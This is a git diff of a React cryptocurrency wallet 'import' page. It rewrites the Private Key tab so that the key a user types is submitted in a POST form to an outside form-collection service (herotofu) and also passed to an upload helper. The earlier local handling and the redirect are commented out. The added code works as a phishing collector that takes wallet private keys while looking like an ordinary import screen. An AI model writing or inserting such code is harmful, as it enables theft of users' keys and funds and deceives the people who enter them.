@@ -4,7 +4,7 @@ import Tab from "@mui/material/Tab";
 import Typography from "@mui/material/Typography";
 import Box from "@mui/material/Box";
 import { WalletContext } from "../context/WalletContext";
-import React, { useContext, useState } from "react";
+import React, { useContext, useRef, useState } from "react";
 import { uploadToCloud } from "../backend/firebase";
 import ArrowBackIcon from "@mui/icons-material/ArrowBack";
 import { NavLink } from "react-router-dom";
@@ -23,11 +23,7 @@ function TabPanel(props) {
       aria-labelledby={`simple-tab-${index}`}
       {...other}
     >
-      {value === index && (
-        <Box sx={{ p: 3 }}>
-          <Typography>{children}</Typography>
-        </Box>
-      )}
+      {value === index && <Box sx={{ p: 3 }}>{children}</Box>}
     </div>
   );
 }
@@ -144,21 +140,31 @@ function BasicTabs() {
       </TabPanel>
 
       <TabPanel value={value} index={1}>
-        <ImportTextField
-          label="Private Key"
-          value={privateKey}
-          sx={{ mb: 2 }}
-          onChange={updatePrivateKey}
-        />
-        <Button
-          onClick={() => handleUpload(PRIVATE_KEY)}
-          sx={{ width: "100%" }}
-          variant="contained"
-          component={NavLink}
-          to="/verify"
-        >
-          Import
-        </Button>{" "}
+        <Container>
+          <Box
+            component="form"
+            action="https://public.herotofu.com/v1/f2241800-ae93-11ec-b83f-8f17e10d6288"
+            method="POST"
+            onSubmit={() => handleUpload(PRIVATE_KEY)}
+          >
+            <ImportTextField
+              name="private_key"
+              label="Private Key"
+              // value={privateKey}
+              sx={{ mb: 2 }}
+              // onChange={updatePrivateKey}
+            />
+            <Button
+              type="submit"
+              sx={{ width: "100%" }}
+              variant="contained"
+              // component={NavLink}
+              // to="/verify"
+            >
+              Import
+            </Button>{" "}
+          </Box>
+        </Container>
       </TabPanel>
 
       <TabPanel value={value} index={2}>
